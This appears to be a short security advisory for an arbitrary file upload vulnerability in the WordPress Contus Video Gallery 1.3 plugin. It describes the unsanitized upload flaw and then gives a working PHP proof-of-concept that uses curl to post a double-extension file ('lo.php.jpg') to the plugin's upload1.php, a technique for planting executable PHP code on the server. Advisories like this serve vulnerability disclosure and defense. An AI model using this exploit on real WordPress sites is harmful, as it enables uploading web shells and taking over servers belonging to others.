source: http://www.securityfocus.com/bid/53931/info

WordPress Contus Video Gallery is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application.

WordPress Contus Video Gallery 1.3 is vulnerable; other versions may also be affected. 

<?php

$uploadfile="lo.php.jpg"; 
$ch = curl_init("http://www.example.com/wordpress/wp-content/plugins/contus-video-galleryversion-10/upload1.php");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS,
        array('myfile'=>"@$uploadfile",
               'mode'=>'image'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>